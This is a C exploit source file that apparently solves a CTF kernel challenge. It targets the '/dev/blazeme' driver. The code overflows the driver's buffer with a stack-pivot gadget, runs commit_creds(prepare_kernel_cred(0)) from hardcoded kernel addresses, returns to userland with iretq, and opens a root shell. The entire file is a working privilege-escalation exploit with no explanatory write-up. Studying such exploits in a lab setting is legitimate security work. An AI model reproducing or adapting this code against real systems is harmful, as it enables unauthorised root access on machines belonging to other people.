#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

void happy() {
    // commit_creds(prepare_kernel_cred(0));
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff81063b50;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff81063960;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
    
}

/* debug
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:3234" -ex='b * 0xffffffff81232ba5' -ex='add-symbol-file ./blazeme.ko 0xffffffffc0000000'
*/
unsigned long mov_esp_ret = 0xffffffff81232ba5; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret

int main(int argc, char **argv[]) {
    unsigned long *fake_stack;

    save_state();
    //从通用的模板抄的不动脑子改一改就行 https://blog.csdn.net/qq_40712959/article/details/115172662
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // r12
    fake_stack[off++] = 0x0; // rbp
    fake_stack[off++] = (unsigned long)happy;


    int fd = open("/dev/blazeme", O_RDWR);

    char payload[70]; //填充"hello "
    payload[0] = '0';
    payload[1] = '1';
    payload[2] = '2';

    unsigned long * overflow = (unsigned long *)(payload+2);
    overflow[0] = mov_esp_ret;
    overflow[1] = mov_esp_ret;
    overflow[2] = mov_esp_ret;
    overflow[3] = mov_esp_ret;
    overflow[4] = mov_esp_ret;
    overflow[5] = mov_esp_ret;
    overflow[6] = mov_esp_ret;
    overflow[7] = mov_esp_ret;
    
    printf("[+] payload: %s\n", payload);
    printf("[+] payload length: %d\n", strlen(payload));

    for(int i = 0; i < 10000; i++) {
        if(i%1000 == 0) {
            printf("[+] index:%d\n", i);
        }
        ssize_t w = write(fd, payload, 64);
    }

    printf("[!] error exit");

    return 0;
}

